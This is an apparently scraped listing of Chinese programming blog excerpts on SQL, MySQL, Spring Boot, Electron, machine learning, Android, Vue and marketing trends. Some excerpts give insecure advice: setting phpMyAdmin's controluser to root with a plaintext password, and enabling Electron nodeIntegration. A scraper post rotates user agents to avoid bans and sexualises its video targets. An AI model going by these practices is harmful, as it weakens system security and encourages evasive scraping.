explain select id,phone,name from tb_user where phone = '17799990010' and name = '韩信'; 通过上述执行计划我们可以看出来，在and连接的两个字段 phone、name上都是有单列索引的，但是 最终mysql只会选择一个索引，也就是说，只能走一个字段的索引，此时是会回表查询的。
紧接着，我们再来创建一个phone和name字段的联合索引来查询一下执行计划
create unique index idx_user_phone_name on tb_user(phone,name); 在业务场景中，如果存在多个查询条件，考虑针对于查询字段建立索引时，建议建立联合索引， 而非单列索引。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8f1efec6fc2b176c0a607a5e90bc09e/" rel="bookmark">
			SQL：数据去重的三种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、使用distinct去重 distinct用来查询不重复记录的条数，用count(distinct id)来返回不重复字段的条数。用法注意：
distinct【查询字段】，必须放在要查询字段的开头，即放在第一个参数；只能在SELECT 语句中使用，不能在 INSERT, DELETE, UPDATE 中使用；DISTINCT 表示对后面的所有参数的拼接取不重复的记录，即查出的参数拼接每行记录都是唯一的不能与all同时使用，默认情况下，查询时返回的就是所有的结果。 distinct支持单列、多列的去重方式。
作用于单列
单列去重的方式简明易懂，即相同值只保留1个。select distinct name from A //对A表的name去重然后显示 作用于多列
多列的去重则是根据指定的去重的列信息来进行，即只有所有指定的列信息都相同，才会被认为是重复的信息。注意，distinct作用于多列的时候只在开头加上即可，并不用每个字段都加上。distinct必须在开头，在中间是不可以的，会报错，`select id,distinct name from A //错误select distinct id,name from A //对A表的id和name去重然后显示 配合count使用
select count(distinct name) from A //对A表的不同的name进行计数 按顺序去重时，order by 的列必须出现在 distinct 中
出错代码
改正后的代码
讨论：若不使用Distinct关键字，则order by后面的字段不一定要放在seletc中
MySQL中使用去重distinct方法的示例详解
【Hive】数据去重
2、使用group by GROUP BY 语句根据一个或多个列对结果集进行分组。在分组的列上我们可以使用 COUNT, SUM, AVG,等函数，形式为select 重复的字段名 from 表名 group by 重复的字段名;
group by 对age查询结果进行了分组，自动将重复的项归结为一组。
还可以使用count函数，统计重复的数据有多少个
3、使用ROW_NUMBER() OVER 或 GROUP BY 和 COLLECT_SET/COLLECT_LIST 说到要去重，自然会想到 DISTINCT，但是在 Hive SQL 里，它有两个问题：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8f1efec6fc2b176c0a607a5e90bc09e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b90b3380d69d8e4008bf904f68732b9/" rel="bookmark">
			mysqli_real_connect(): (HY000/1045): Access denied for user ‘root‘@‘localhost‘ (using password: YES
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如题，phpmyadmin登录报错，网上看到一个解决方法：(232条消息) mysqli_real_connect(): (HY000/1045): Access denied for user ‘root‘@‘localhost‘ (using password: YES_学霸的男人的博客-CSDN博客
我使用的Appserv安装的mysql，对应的文件是config.sample.inc.php ，将注释掉的
// $cfg['Servers'][$i]['controluser'] = 'pma'; // $cfg['Servers'][$i]['controlpass'] = 'pmapass'; 打开，改为：
$cfg['Servers'][$i]['controluser'] = 'root'; $cfg['Servers'][$i]['controlpass'] = '13245678'; 注意 $cfg['Servers'][$i]['controlpass'] = '13245678'; 这里必须改成8位以上字符的密码，不然还是不能登录，改完后保存文件，使用刚刚改完的用用户名和密码重新成功登录PHPmyadmin
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c50e7cac4244802c6598840223615848/" rel="bookmark">
			SpringBoot的大致步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于一个bean而言，需要下列的注释。
//需要在IDEA的插件市场中搜索LomBok插件并安装 @NoArgsConstructor @AllArgsConstructor @Getter @Setter @ToString public class Customer { private String username; private String password; private String address ; private Integer age ; //构造器(无参 + 有参) //get/set //tostring //.... } 控制层
@RestController // @Controller + @ResponseBody //标识为控制层。 public class CustomerController { //SpringBoot @Autowired //从Spring容器中找到对应类型的对象， 注入过来 @Qualifier("customerServiceImplNew") // 明确指定将哪个对象注入过来，注入的是对应类的对象，显然是接口实现的类对应的对象。 CustomerService customerService ; /** * http://localhost:8080/login?username=zhangsan&amp;password=123456 */ @GetMapping("login") public String login(@RequestParam("username") String username, @RequestParam("password") String password){ //业务处理 //在每个方法中创建业务层对象， 不好. //CustomerServiceImpl customerService = new CustomerServiceImpl(); String result = customerService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c50e7cac4244802c6598840223615848/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d92b80a7d382c2515c61333a3a89577/" rel="bookmark">
			从1000篇热门笔记，看小红书的种草趋势
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022年的双11即将落下帷幕，小红书在大促前后为各大品牌的推广营销提供了丰沃的土壤，通过新红的[种草流量大盘]能看到，9月底、10月初开始，平台的种草笔记数量相比之前呈现增长的势头。
种草笔记：笔记的标题或内容中提及相关品牌关键词的笔记
▲ 新红-大盘数据-种草流量大盘
浓厚的创作氛围下，平台涌现出不少优质内容，博主们通过场景化种草、生活理念分享等方式，将产品种草给用户。
近期平台的种草趋势是什么？高质量的种草笔记都有哪些特点？我们选取了近30天内互动量表现前1000的种草笔记加以分析，为博主的内容创作提供参考。
从1000篇热门笔记中
看平台近期的种草趋势
观察近期互动量TOP1000的种草笔记发现，美妆、美食、美容个护和科技互联网等类别的笔记内容较为流行，也容易获得高互动数据。
从笔记形式来看，视频笔记占比更多达到68.6%，科技互联网、母婴育儿、萌宠、生活等类别的内容多采用视频形式，视频能透露出更多信息；穿搭打扮、健康养生、摄影摄像等类别用图片也能很好展现，图文笔记数量占比接近一半。
▲ 互动量TOP1000种草笔记-类别分布
KOC通常在小红书扮演连接品牌和用户的重要角色，类似朋友的定位让他们的种草行为显得真诚自然，热门种草笔记中，由腰部达人发布的笔记数占比达到34.3%，初级达人发布的笔记数占比22.8%。
头部KOL则能撬动更多用户，传递品牌价值，热门种草笔记中有25.1%由KOL发布，生活、萌宠等类别中头部博主的作品更受到关注。
▲ 互动量TOP1000种草笔记-账号属性分布
同时有更多博主选择深耕细分赛道，成为垂类更具有话语权与影响力的意见领袖，选择的赛道不同，种草效果也会有区别。以博主的二级分类来看，近期，彩妆、小剧场、母婴日常、美食教程、穿搭、猫、游戏等类别创作者发布的笔记热度更高。
▲ 互动量TOP1000种草笔记-部分作者分类
在新红拉取的互动量TOP1000的笔记中，有491条有标注出合作品牌，即品牌投放的商业笔记，包括倩碧、科颜氏等美妆品牌，追觅、小熊电器等家居品牌，以及美食、日用等品牌。
近500条商业笔记平均互动数为4.95w，并不算低，可见虽然是与品牌合作的内容，但只要博主能保持高水平的内容输出，推荐合适的产品，粉丝也是乐于接受种草的。
▲ 互动量TOP1000种草笔记-部分合作品牌
挖需求、场景化、小剧场
这些种草笔记更受欢迎
具体到更容易受到用户青睐的笔记，近期这些类型的内容在平台走红。
挖掘需求输出干货
带来新认知的知识在小红书一直颇受欢迎，将干货输出与产品介绍相结合，可在科普的同时带出产品，吸引有需求的用户，对在大促期间有购买计划的用户来说，更容易被种草甚至转化。
@人类行为设计师-小周10月17日发布的笔记《打造学习型电脑‼️这些宝藏功能你必须得知道》，就在分享提升工作学习效率的电脑软件工具时，使用联想YOGA笔记本做实操展示，突出其可360度折叠代替平板、可触屏操作、触控笔可手书等特点。
▲ 图源小红书
此类笔记既不引起用户反感又能将核心卖点引出，互动数据也足够亮眼，小周的笔记点赞数25.05w，收藏数23.4w，对比博主近期的平均水平高出8倍。
▲ 新红-笔记详情页
类似的，@熙熙妈妈的笔记《孕妇怎么吃出高质量宝宝》分享孕期经验种草爱乐维的藻油DHA，赞藏总量27.14w；@来个栗子🌙的笔记《真不是智商税啊啊啊，这样去黑头好牛！！！》分享去黑头方法推荐雾屿森林水杨酸棉片，赞藏量24.25w，均是提出产品卖点结合用户需求输出干货内容。
营造实用生活化场景
如果没有干货可输出，不如挖掘生活中的具体使用场景，实用化场景比纯知识更能让用户有共鸣感，联想到自身情况产生消费想法。
@懒同学的宿舍就以大学宿舍地方小诸多不便为场景，分享提升住校舒适度的小妙招种草产品，博主从7月份开始发布笔记，目前发布的34条笔记中点赞上万的已经有8条，平均点赞7.42w，爆文率23.5%。
▲ 新红-账号详情页
其10月15日发布的笔记《 4人寝多功能床位✌🏻睡觉I娱乐I学习I换衣区》互动数19.8w。视频中，博主推荐好物将宿舍床位打造出多种实用功能，如滑轨床帘等，床垫也在推荐之列，大学宿舍床板易潮，使用不闷热返潮的翼眠床垫拥有良好的睡眠，对学生来说是十分有用的。
▲ 图源小红书
此外，还有博主@小旎的漫画日常发布笔记《女生秒懂 崩溃》，画出日常生活中女生生理期的尴尬场景，带出产品她研社日夜安心裤防侧漏日夜安心，获赞22.21w；博主@小岛大瑀发布笔记《这个燃脂舞真的太❗️太❗️太简单了🔥停不下来》，呼吁燃脂的同时也要关注体脂率，成功种草云麦体脂秤，笔记赞藏数26.87w。
小剧场提供情绪价值
创作者在给用户提供实用价值外，也能通过分享情绪价值完成对产品的种草，近期部分优质的小剧场内容也受到粉丝的欢迎。
如博主@秦苒发布的视频笔记《 叫什么小秦总，叫姐姐！》中，讲述女强人小秦总和职场新人心怡两人因一起事件结识并成为好友的故事，两人间表现出的深厚闺蜜情谊惹人羡慕。
故事发展过程中，植入的祖玛珑香水很好地起到串联剧情的作用，让用户很自然注意到并评论“好闺蜜就是要用同款香水”。该条笔记获赞18.21w，预估阅读214.99w。
▲ 图源小红书
同样是小剧场，@丁郑美子分享的校园高光时刻，勾起学生时代记忆，种草倩碧美白瓶，获赞15.21w；@奥黛丽厚本则通过魔改版灰姑娘《灰娘娘》推荐切尔西皮鞋，获赞14.92w。可以发现，小剧场的形式对剧本、拍摄、后期等要求高，适用于团队规模较大的头部博主。
对创作者来说，除了笔记内容能提供价值外，评论区也是需要重点维护的地方，与粉丝良好的互动同样也能提升笔记的权重。最近小红书开始内测的新功能“互动组件”，支持发布笔记时设置投票或PK功能，通过互动组件，可提前埋下话题点，提升与粉丝的互动效果，博主们可关注使用。
▲ 图源小红书
以上是近期小红书平台上的热门趋势及热门笔记的分析与总结。
获悉更多种草数据，热门内容，可登录新红数据PC端（xh.newrank.cn）或前往体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b5bcbe948118b296667213597ea9f19/" rel="bookmark">
			解决npm install安装vue-element-admin报错 Error while executing: C:\Program Files\Git\cmd\git.EXE ls-remote
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
解决方案：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0edd5b15b22fe7cdf5f68da6c111ff93/" rel="bookmark">
			CentOS 7.5一键脚本安装MySQL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CentOS 7.5一键脚本安装MySQL mysql 版本 : mysql-5.7.27-linux-glibc2.12-x86_64.tar.gz
shell脚本： auto_install_mysql.sh
脚本写权限 [root@localhost /]# chmod +x auto_install_mysql.sh
[root@localhost /]# yum install -y dos2unix.x86_64
[root@localhost /]# dos2unix auto_install_mysql.sh
dos2unix: converting file auto_install_mysql.sh to Unix format …
写入脚本
[root@localhost /]# sh auto_install_mysql.sh ##以下为脚本代码
#!/bin/bash export LANG=en_US.UTF-8 INSTALL_PATH=$(pwd) echo "当前目录:"+${INSTALL_PATH} echo "删除mysql相关配置文件并copy my.cnf到etc目录" rm -rf /etc/my.cnf rm -rf /etc/init.d/mysql cp my.cnf /etc/my.cnf echo "创建mysql用户组和用户" groupadd mysql useradd -g mysql mysql echo "解压.tar.gz到指定文件夹下 /usr/local/mysql" tar -vxzf mysql-5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0edd5b15b22fe7cdf5f68da6c111ff93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09bd1d3f795ed10f85215c6f2ab929fc/" rel="bookmark">
			electron开发mac/windows桌面程序，配合vue3&#43;vite进行配置开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		electron开发文档：https://www.electronjs.org/zh/docs/latest
vue3开发文档：https://cn.vuejs.org/guide/introduction.html
先按照文档创建一个vue3项目，按照实际需要进行相关配置，官网有介绍。
npm init vue@latest 然后在原基础上安装electron相关依赖，我用pnpm命令，大家可用npm，yarn，cnpm都可以添加
pnpm add -D concurrently cross-env electron electron-builder electron-packager wait-on 在根目录创建一个文件夹electron，里面放electron.js和preload.js
代码如下：
electron.js
// electron/electron.js const path = require('path'); const { app, BrowserWindow } = require('electron'); const isDev = process.env.IS_DEV == 'true' ? true : false; function createWindow() { // Create the browser window. const mainWindow = new BrowserWindow({ width: 800, height: 800, webPreferences: { // preload: path.join(__dirname, 'preload.js'), nodeIntegration: true, }, }); // and load the index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09bd1d3f795ed10f85215c6f2ab929fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25f23c2b929e2bb97a40de33925b4c43/" rel="bookmark">
			深度学习4-SVM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SVM和KNN分类的对比 KNN
KNN分类问题：一定距离内那类点多，就归为哪一类
​
SVM
SVM分类问题，找决策边界，把数据进行划分
​
SVM分类的原理 支持向量积 将两组数据划分开，怎么样的决策边界才会更好
支持向量积
​
支持向量
寻找支持向量
选出最好的决策边界
1.距离计算（点到平面的距离） ​
点现在知道了，但面其实是不知道的，需要进行假设。
用到了向量和法向量的知识。
2.目标函数 目的：找到一条线，使得离该线最近的点能够最远
放缩变换和优化目标
目标函数能够体现SVM的基本定义
3.部分数学原理 3.1拉格朗日乘子法 3.1.1在约束条件下求极值的问题 约束条件中可能不仅仅包含一个变量，能不能把约束条件看成一个整体？（引入新的参数，但参数和其中的变量是用关系的） 3.1.2引入新的参数a1（原本的参数是w、b） 3.1.3求偏导，为了求极值 简化最终目标函数 w、b通过相关关系，全部转化为a相关的参数，方便进行求解 极大值问题转化为极小值问题
4.软间隔优化 考虑一些异常的噪音，让分类更合理。（引入松弛因子） 目标函数的变化，及c的引入（能够提现容错能力）
5.核函数（分类好的关键） 升维，二维的变成三维的，可能能够很好的用平面分开 升维效果展示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd28e2ea943ab22467ead6a44e76811f/" rel="bookmark">
			C&#43;&#43;基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++ 1、C++概述 C++是一种计算机高级程序设计语言，由C语言扩展升级而来。
C++既可以进行C语言的过程化程序设计，又可以进行以抽象数据类型为特点的基于对象的程序设计，还可以进行以继承和多态为特点的面向对象的程序设计。即C++擅长面向对象程序设计的同时，还可以进行基于过程的程序设计。
C++拥有计算机运行的实用性特征，同时还致力于提高大规模程序的编程质量与程序设计语言的描述问题
-----百度百科
2、C++关键字 C++相比较与C语言，增加了将近一倍数量关键字，C++总计有63个关键字。如图：
3、命名空间 3.1、问题提出
在C语言中，当我们定义变量名时，变量名与库中的函数重名，就会报错。如图：
变量名rand与库中的rand函数重名时，就会报重定义错误。
同样的，当我们在工程中，两个程序员在各自写代码的过程中使用了同名的变量名，就会出现错误，C++为了解决这一问题引入了命名空间。
3.2、命名空间定义
​ 定义命名空间需要使用namespace关键字，后面跟命名空间的名字，然后接一对｛｝即可，｛｝中即为命名空间的成员。
注意：一个命名空间就定义了一个新的作用域，命名空间中所有内容都局限于该命名空间中
3.3 命名空间的使用
加命名空间名称及作用域限定符（：：） namespace cpp { int n = 0; int m = n + 1; } int main() { int k = cpp::n; //使用作用域限定符（::） std::cout &lt;&lt; cpp::n &lt;&lt; std::endl; return 0; } 使用using将命名空间中某个成员引入 namespace cpp { int n = 0; int m = n + 1; } using cpp::n; //将命名空间中的n释放 int main() { int k = n; return 0; } 使用 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd28e2ea943ab22467ead6a44e76811f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/072ed1474b5bb2f3a0dd4fca79bc2088/" rel="bookmark">
			t-SNE降维可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.高斯分布：
2.卡方分布：
3.t分布
4. t-SNE（t-Distributed Stochastic Neighbor Embedding）
（1）在高维空间构建一个概率分布拟合高维样本点间的相对位置关系。
（2）在低维空间，也构建一个概率分布，拟合低维样本点之间的位置关系。
5. SNE的缺点以及解决措施
1.高斯分布： 2.卡方分布： 若n个相互独立的随机变量， 均服从标准正态分布（独立同分布于标准正态分布），则这n个服从标准正态分布的随机变量的平方和构成一新的随机变量，其分布规律成为x2分布，参数n=v，记为Q~x2（v）。
3.t分布 设随机变量X~ N(0,1)（标准正态分布）,Y~x2 (n)（自由度为n的卡方分布），且X与Y相互独立，则称随机变量 服从自由度为n的t分布，t分布在自由度较低时相对标准正态分布表现更柔和（矮胖）。记为：
4. t-SNE（t-Distributed Stochastic Neighbor Embedding） （1）在高维空间构建一个概率分布拟合高维样本点间的相对位置关系。 以样本xi为中心，不同样本点与xi的相对位置的概率分布。
衡量两个样本间的距离，距离越大，概率 越小。分母累加求和为了归一化。
（2）在低维空间，也构建一个概率分布，拟合低维样本点之间的位置关系。 （3） 通过学习，调整低维数据点，令两个分布接近。利用KL散度（距离）衡量两个分布之间的差异。通过梯度下降调整低维空间的样本点y使得C变小，实现降维。
目标：yi对应xi投影到低维空间，调整yj使得KL散度（可看做损失函数）最小，即低维空间与高位空间的位置分布尽可能一致。
本质：高维空间样本位置关系的分布投影至低维空间时保持不变。
5. SNE的缺点以及解决措施 （1）距离不对称， 利用联合概率代替条概率。
（2）拥挤现象
从高维到低维进行转换的过程中，低维点的距离无法建模高维点之间的位置关系。高维空间中距离较大的点对，在低维空间距离会变得较小。
解决：利用拖尾较大的t分布对低维点建模。
使用t分布后，在正态分布中距离较小的点，可保持相同的概率在t分布中获得更小的距离（拉近高维空间中距离较近的点）。在正态分布中距离较大的点，可保持相同的概率在t分布中获得更大的距离（排斥高维空间中距离较远的点）。
（3）的物理意义，影响高维空间中高斯分布的形状，
类似于K紧邻中的搜索半径，当xi临近点较多时，减小 ；当xi临近点较少时，增大 。
t-SNE是一种集降维与可视化于一体的技术，它是基于SNE可视化的改进，解决了SNE在可视化后样本分布拥挤、边界不明显的特点，是目前最好的降维可视化手段。
t-SNE目标函数：原空间与嵌入空间样本分布之间的KL散度。
t-SNE优化算法：梯度下降。
t-SNE注意问题：KL散度作目标函数是非凸的，对初值敏感，需要多次初始化以防止陷入局部次优解
（4）影响效果的参数
perplexity 混乱度。混乱度越高，t-SNE将考虑越多的邻近点，更关注全局。因此，对于大数据应该使用较高混乱度，较高混乱度也可避免噪声的影响。相对而言，该参数对可视化效果影响不大。
early exaggeration factor 该值表示期望的簇间距大小，如果太大的话（大于实际簇的间距），将导致目标函数无法收敛。相对而言，该参数对可视化效果影响较小，默认就行。
learning rate 学习率。关键参数，根据具体问题调节。
maximum number of iterations 迭代次数。迭代次数不能太低，建议1000以上。
angle (not used in exact method) 角度。相对而言，该参数对效果影响不大。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/072ed1474b5bb2f3a0dd4fca79bc2088/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a57be11a1b5f30d76dde19b6bc6c7a8a/" rel="bookmark">
			Android开发，RecyclerView在ScrollView中完全展开
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在开发过程经常会组合使用RecyclerView和ScrollView，但是它经常显示不兼容，后面发现只要给RecyclerView的外层加上一个RelativeLayout 就可以解决该问题。特此记录一下。
xml页面：
&lt;ScrollView android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;RelativeLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:descendantFocusability="blocksDescendants"&gt;&lt;!--这句很重要，不能少--&gt; &lt;androidx.recyclerview.widget.RecyclerView android:id="@+id/recyclerView" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="@dimen/dp_5" android:layout_marginTop="@dimen/dp_10" android:layout_marginRight="@dimen/dp_5" /&gt; &lt;/RelativeLayout&gt; &lt;/ScrollView&gt; MainActivity：
RecyclerView recyclerView = findViewById(R.id.recyclerView); GridLayoutManager gridLayoutManager = new GridLayoutManager(this, 2); recyclerView.setLayoutManager(gridLayoutManager); recyclerView.setNestedScrollingEnabled(false);//禁止recyclerView嵌套滑动 至此，就可以实现想要的效果了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cba05bdf9b3fcc462ae84e0f3ace409/" rel="bookmark">
			GitHub的下载超时问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitHub 下载（clone）项目时，报错 Failed to connect to github.com port 443 after 21081 ms: Timed out
这种情况基本上时因为连接超时，可以尝试在git bash中使用下面的命令进行重新设置代理
git config --global --unset http.proxy git config --global --unset https.proxy 然后再进行clone就可以了
分享一个插件，可以快速访问github 当打开这个插件进行pull时，不会出现time out的问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/169412a68121ca87a3d2090585d62bba/" rel="bookmark">
			黑丝，白丝，全都要。某站的视频爬取加合成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		还是很久之前写的爬虫，爬取某站的视频，因为某站的视频和音频是分开的，所以最后还需要合成在一起。
某站的舞蹈区大家都知道有很多的黑丝、白丝。嗯。。。都懂的，所以，下载下来被窝里偷偷看。
详细解释都在注释区
大家爬取的时候要注意延时一段时间，某站的访问量是很大。太快爬取会被封的。
import requests from fake_useragent import UserAgent import jsonpath import re import os import time # 请求头 headers = {"User-Agent": UserAgent().random, "referer": "你自己的refer"} # 创建存放视频的文件夹 if not os.path.exists("创建的文件夹名"): os.mkdir("创建的文件夹名") # 更改文件路径 os.chdir(r"你想要存放的路径") # # 视频列表页url for i in range(1, 3): # 因审核的原因，接口不能放出来，大家可以自行找找接口，加上即可食用 # 获取up主的视频列表接口。mid=后面的一串数字更改为其他up主的，即可爬取其他up主的视频列表页 url = "up主的视频列表接口" time.sleep(0.5) response = requests.get(url, headers=headers).json() # 解析网页 bvid = jsonpath.jsonpath(response, "$..bvid") # 拼接网址 link = "某站的网址后加上 /video/ 即可" detail_url = [link + i for i in bvid] # 循环下载 for url_link in detail_url: time.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/169412a68121ca87a3d2090585d62bba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/584ecc15414044d9059ea17dcc2a49f9/" rel="bookmark">
			Linux--基础命令执行不了,提示未找到该命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、基础命令无法执行原因二、解决方法三、总结 前言 linux服务重启后，发现基础命令都不可以执行，提示：未找到命令
一、基础命令无法执行原因 出现此情况前，修改了环境变量，此时输出看下环境变量是否被修改
[root@localhost ~]# echo $PATH /root/instantclient_12_2:/root/bin 二、解决方法 登录服务器，直接执行以下命令
export PATH=$PATH:/usr/bin 三、总结 出现以上情况，首先检查机器本身的环境变量是否不小心被修
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a580f0561e2f1e05294e3636231c04a6/" rel="bookmark">
			突发情况1-ADM升级报错（195、182、126、76）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、ADM所遇问题 1.错误195 由于无法访问必需的web资源
2.错误182检测到不受支持的amd显卡硬件
3.Loadlibrary failed with error 126:找不到指定的模块
4.loadlibrary failed with error 87:参数错误
二、使用的解决方法： 1. 通过腾讯电脑管家-工具箱-硬件检测，获取显卡信息
2. 通过官网-选择产品-提交进入AMD驱动下载页面
官网链接：https://www.amd.com/zh-hans/support
3. 下载对应系统的最新驱动进行安装-问题解决
官网链接：https://www.amd.com/zh-hans/support
三、特殊：推荐一款比驱动精灵好用的驱动升级软件： 驱动天使 – 免费 速度快
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b9943d4584b640a15a1376f21babf83/" rel="bookmark">
			解决chrom浏览器iframe嵌套写cookie问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 chrom浏览器iframe嵌套写cookie 1、请求地址协议：2、response头部设置3、提供如下方式进行设置：1)、后端web服务代码如下：2)、nginx服务器设置： 场景分析描述：chrom浏览器环境下当前网站被第三方iframe嵌套，如何保证cookie值成功写入 1、请求地址协议： 保证请求的url必须是https协议。
2、response头部设置 response.setHeader("Set-Cookie","Path=*; SameSite=None; Secure"); 3、提供如下方式进行设置： 1)、后端web服务代码如下： Cookie cookie = new Cookie("usertoken", token); cookie.setPath("/"); cookie.setMaxAge(12*60*60); StringBuffer url = request.getRequestURL(); String tempContextUrl = url.delete(url.length() - request.getRequestURI().length(), url.length()).toString(); response.addCookie(cookie); if(tempContextUrl.contains("http://www.xxx.com")){ String ut="usertoken="+token+";"; response.setHeader("Set-Cookie",ut+"Path=*; SameSite=None; Secure"); tempContextUrl = tempContextUrl.replaceAll("http","https"); } response.sendRedirect(tempContextUrl+"/aaa/bbb?ccc=true&amp;ddd="+tempid); 2)、nginx服务器设置： add_header 'Set-Cookie' 'Path=*;SameSite=None;Secure'; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/298b9f112bb50702620eba5801832df9/" rel="bookmark">
			React Native模仿蒙德里安画风的布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 模仿蒙德里安画风的布局 import React from 'react'; import { View, Text, StyleSheet } from 'react-native'; const styles = StyleSheet.create({ parent: { borderWidth: 2, flex: 1, flexDirection: "row", }, leftChild: { flex: 1, flexDirection: "column", backgroundColor: "#fff", borderRightWidth: 1 }, leftGrandChild1: { flex: 1, borderBottomWidth: 1 }, leftGrandChild2: { flex: 2, borderTopWidth: 1, borderBottomWidth: 1 }, leftGrandChild3: { flex: 1, backgroundColor: "#ccc", borderTopWidth: 1 }, rightChild: { flex: 2, flexDirection: "column", backgroundColor: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/298b9f112bb50702620eba5801832df9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/381d0949a8e70b9e23cabbbfbcd97a3e/" rel="bookmark">
			vue2基础-vue指令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Once v-once指令:让界面不要跟着数据变化, 只渲染一次
&lt;p v-once&gt;原始数据: {{ name }}&lt;/p&gt; 2、v-cloak ①　Vue数据绑定过程 vue会先将未绑定数据的界面展示给用户,然后再根据模型中的数据和控制的区域生成绑定数据之后的HTML代码,最后再将绑定数据之后的HTML渲染到界面上。
正是在最终的HTML被生成渲染之前会先显示模板内容，所以如果用户网络比较慢或者网页性能比较差, 那么用户会看到模板内容。
②　v-cloak 利用v-cloak配合 [v-cloak]:{display: none}默认先隐藏未渲染的界面,等到生成HTML渲染之后再重新显示。
v-cloak指令作用:数据渲染之后自动显示元素。
[v-cloak] { display: none } &lt;p v-cloak&gt;{{ name }}&lt;/p&gt; 3、v-text和v-html v-text就相当于过去学习的innerText
v-text会覆盖原来的html，但不会自动解析html
&lt;p v-text="name"&gt;++++++++&lt;/p&gt; v-html就相当于过去学习的innerHTML
v-html会覆盖原来的html，会自动解析html
&lt;p v-html="name"&gt;++++++++&lt;/p&gt; 4、v-if 如果v-if取值是true就渲染元素, 如果不是就不渲染元素。
特点：如果条件不满足根本就不会创建这个元素。
v-if可以从模型中获取数据，也可以直接赋值一个表达式。
&lt;p v-if="hidden"&gt;我是false&lt;/p&gt; &lt;p v-if="true"&gt;我是true&lt;/p&gt; &lt;p v-if="age &gt;= 18"&gt;我是true&lt;/p&gt; v-else指令可以和v-if指令配合使用, 当v-if不满足条件时就执行v-else就显示v-else中的内容。v-else不能单独出现，v-if和v-else中间不能出现其它内容。
v-else-if可以和v-if指令配合使用, 当v-if不满足条件时就依次执行后续v-else-if, 哪个满足就显示哪个。
&lt;p v-if="score &gt;= 80"&gt;优秀&lt;/p&gt; &lt;p v-else-if="score &gt;= 60"&gt;良好&lt;/p&gt; &lt;p v-else&gt;差&lt;/p&gt; 5、v-show v-show和v-if的能够一样都是条件渲染, 取值为true就显示, 取值为false就不显示。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/381d0949a8e70b9e23cabbbfbcd97a3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e66e788e9d25c352f2bc83bfea91badc/" rel="bookmark">
			3dmax批量导出模型名称和材质名称
			</a>
		</h2>
		
	</header>
